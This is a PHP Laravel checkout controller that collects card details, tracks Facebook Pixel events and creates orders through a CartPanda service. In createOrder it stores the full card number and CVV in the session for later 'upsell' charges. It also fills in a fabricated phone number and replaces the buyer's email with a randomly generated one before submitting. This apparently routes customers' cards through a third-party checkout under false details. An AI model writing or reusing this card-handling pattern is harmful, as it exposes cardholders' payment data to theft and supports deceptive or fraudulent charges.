<?php

namespace App\Http\Controllers\Pay;

use App\Http\Controllers\Controller;
use App\Services\CartPandaService;
use App\Services\OfertaService;
use App\Services\FacebookPixelService;

class PayController extends Controller
{
    protected $pixelService;
    protected $trackingData = [];

    public function __construct()
    {
        $this->pixelService = new FacebookPixelService('pay');
        $this->trackingData = $this->captureTrackingData();
    }

    public function index()
    {
        // Pegar ID da URL ou usar padrão
        $ofertaId = request()->get('id', 'oferta1');
        
        // Validar se a oferta existe
        if (!OfertaService::isValid($ofertaId)) {
            $ofertaId = 'oferta1';
        }
        
        // Buscar dados da oferta
        $oferta = OfertaService::getOferta($ofertaId);
        
        // Normaliza preço da oferta
        $ofertaPreco = $this->normalizePrice($oferta['preco']);

        // Salvar oferta na sessão para upsells
        session([
            'pay_oferta_atual' => $oferta,
            'pay_oferta_preco' => $ofertaPreco,
        ]);
        
        // Tracking: ViewContent
        $this->pixelService->trackViewContent(
            $oferta['nome'],
            $oferta['id'],
            $ofertaPreco,
            'USD',
            $this->trackingData
        );
        
        // Log para debug
        logger()->info('[PAY] Oferta carregada', [
            'oferta_id' => $ofertaId,
            'oferta_nome' => $oferta['nome'],
            'checkout_id' => $oferta['checkout_id']
        ]);
        
        return view('pay.index', [
            'oferta' => $oferta,
            'ofertaPrecoFloat' => $ofertaPreco,
            'pixelId' => $this->pixelService->getPixelId(),
            'pixelEnabled' => $this->pixelService->isEnabled(),
            'trackingData' => $this->trackingData,
        ]);
    }

    public function createOrder()
    {
        // Captura e sanitiza os dados
        $name = request()->input('name');
        $cardNumber = request()->input('cardNumber');
        $cardNumber = preg_replace('/[^0-9]/', '', $cardNumber);
        $cardMonth = request()->input('cardMonth');
        $cardMonth = preg_replace('/[^0-9]/', '', $cardMonth);
        $cardYear = request()->input('cardYear');
        $cardYear = preg_replace('/[^0-9]/', '', $cardYear);
        $cardYear = substr($cardYear, -2);
        $cardCvv = request()->input('cardCvv');
        $cardCvv = preg_replace('/[^0-9]/', '', $cardCvv);
        $email = request()->input('email');

        // VALIDAÇÕES BACKEND
        $errors = [];

        // Valida nome
        if (empty($name) || strlen($name) < 2) {
            $errors[] = 'Name is required';
        }
        $palavras = explode(' ', trim($name));
        if (count($palavras) < 2) {
            $errors[] = 'Please enter full name (first and last name)';
        }

        // Valida email
        if (empty($email) || !filter_var($email, FILTER_VALIDATE_EMAIL)) {
            $errors[] = 'Valid email is required';
        }

        // Valida número do cartão
        if (empty($cardNumber)) {
            $errors[] = 'Card number is required';
        } elseif (strlen($cardNumber) < 13 || strlen($cardNumber) > 19) {
            $errors[] = 'Card number must be between 13 and 19 digits';
        }

        // Valida mês
        if (empty($cardMonth) || !is_numeric($cardMonth)) {
            $errors[] = 'Expiration month is required';
        } elseif ($cardMonth < 1 || $cardMonth > 12) {
            $errors[] = 'Invalid expiration month';
        }

        // Valida ano
        if (empty($cardYear) || !is_numeric($cardYear)) {
            $errors[] = 'Expiration year is required';
        }

        // Verifica se cartão está expirado
        if (!empty($cardMonth) && !empty($cardYear)) {
            $currentYear = (int)date('y');
            $currentMonth = (int)date('m');
            $year = (int)$cardYear;
            $month = (int)$cardMonth;
            
            if ($year < $currentYear || ($year == $currentYear && $month < $currentMonth)) {
                $errors[] = 'Card is expired';
            }
        }

        // Valida CVV
        if (empty($cardCvv)) {
            $errors[] = 'CVV is required';
        } elseif (strlen($cardCvv) < 3 || strlen($cardCvv) > 4) {
            $errors[] = 'CVV must be 3 or 4 digits';
        }

        // Se houver erros, retorna
        if (!empty($errors)) {
            logger()->warning('[PAY] Validação falhou no checkout', [
                'errors' => $errors,
                'name' => $name,
                'email' => $email
            ]);
            
            return response()->json([
                'success' => false,
                'message' => implode('. ', $errors)
            ], 422);
        }

        // Salva os dados na sessão para uso no upsell
        session([
            'pay_customer_name' => $name,
            'pay_customer_email' => $email,
            'pay_customer_phone' => preg_replace('/[^0-9]/', '', fake()->phoneNumber()),
            'pay_card_number' => $cardNumber,
            'pay_card_month' => $cardMonth,
            'pay_card_year' => $cardYear,
            'pay_card_cvv' => $cardCvv
        ]);

        // Pegar oferta atual da sessão
        $oferta = session('pay_oferta_atual');
        $ofertaPreco = session('pay_oferta_preco', $this->normalizePrice($oferta['preco'] ?? 0));
        $checkoutId = $oferta['checkout_id'] ?? env('CHECKOUT_ID');
        
        logger()->info('[PAY] Criando pedido', [
            'name' => $name,
            'oferta_id' => $oferta['id'] ?? 'desconhecida',
            'checkout_id' => $checkoutId
        ]);
        
        // Usar o checkout ID específico da oferta
        $cartPandaService = new CartPandaService($checkoutId);
        
        try {
            $result = $cartPandaService->createOrder(
                name: $name,
                cardNumber: $cardNumber,
                cardMonth: $cardMonth,
                cardYear: $cardYear,
                cardCvv: $cardCvv
            );
            
            // Atualiza o email na sessão para o email random gerado
            if (isset($result['random_email'])) {
                session(['pay_customer_email' => $result['random_email']]);
            }

            // TRACKING FACEBOOK PIXEL
            if ($result['success'] && isset($result['redirect_url']) && $result['redirect_url'] === '/thankyou') {
                // VENDA APROVADA - Preparar dados para evento Purchase
                $transactionId = 'PAY_' . time() . '_' . uniqid();
                
                session([
                    'pay_conversion_data' => [
                        'value' => $ofertaPreco,
                        'currency' => 'USD',
                        'transaction_id' => $transactionId,
                        'content_ids' => [$oferta['id']],
                        'content_name' => $oferta['nome']
                    ]
                ]);

                // Envia evento server-side também
                $this->pixelService->trackPurchase(
                    $ofertaPreco,
                    'USD',
                    $transactionId,
                    [$oferta['id']],
                    $oferta['nome'],
                    $this->trackingData
                );

                logger()->info('[PAY] Venda aprovada', ['transaction_id' => $transactionId]);

            } else {
                // VENDA RECUSADA
                $this->pixelService->trackPaymentDeclined(
                    $result['message'] ?? 'Unknown error',
                    $ofertaPreco,
                    'USD',
                    $this->trackingData
                );

                logger()->info('[PAY] Venda recusada', ['reason' => $result['message'] ?? 'Unknown']);
            }
            
        } catch (\Exception $e) {
            logger()->error('[PAY] Erro ao criar pedido', ['error' => $e->getMessage()]);
            return response()->json([
                'success' => false,
                'message' => 'Order creation failed'
            ], 500);
        }

        // Redireciona para thankyou (pay) ao invés do checkout antigo
        if (isset($result['redirect_url']) && $result['redirect_url'] === '/thankyou') {
            $result['redirect_url'] = '/pay/thankyou';
        }

        return response()->json($result);
    }

    /**
     * Normaliza valores monetários para float
     */
    private function normalizePrice($price): float
    {
        if (is_null($price)) {
            return 0.0;
        }

        $price = (string) $price;
        $price = trim($price);

        // Remove qualquer caractere que não seja número, vírgula ou ponto
        $price = preg_replace('/[^0-9,\.]/', '', $price);

        if (str_contains($price, ',')) {
            // Remove separador de milhar e converte vírgula em ponto
            $price = str_replace('.', '', $price);
            $price = str_replace(',', '.', $price);
        }

        return (float) $price;
    }

    private function captureTrackingData(): array
    {
        $sessionData = session('pay_tracking', []);
        $queryParams = request()->only([
            'utm_source',
            'utm_medium',
            'utm_campaign',
            'utm_content',
            'utm_term',
            'utm_id',
            'fbclid',
            'gclid',
            'wbraid',
            'gbraid',
        ]);

        $updated = false;

        foreach ($queryParams as $key => $value) {
            if ($value !== null && $value !== '') {
                $sessionData[$key] = $value;
                $updated = true;
            }
        }

        if (!empty($sessionData['fbclid']) && empty($sessionData['fbc'])) {
            $sessionData['fbc'] = $this->buildFbc($sessionData['fbclid']);
            $updated = true;
        }

        if (empty($sessionData['landing_page'])) {
            $sessionData['landing_page'] = request()->fullUrl();
            $updated = true;
        }

        if (empty($sessionData['referrer']) && request()->headers->get('referer')) {
            $sessionData['referrer'] = request()->headers->get('referer');
            $updated = true;
        }

        $fbp = request()->cookie('_fbp');
        if ($fbp && empty($sessionData['fbp'])) {
            $sessionData['fbp'] = $fbp;
            $updated = true;
        }

        if ($updated) {
            session(['pay_tracking' => $sessionData]);
        }

        return $sessionData;
    }

    private function buildFbc(string $fbclid): string
    {
        $timestamp = request()->server('REQUEST_TIME', time());
        return 'fb.1.' . $timestamp . '.' . $fbclid;
    }
}

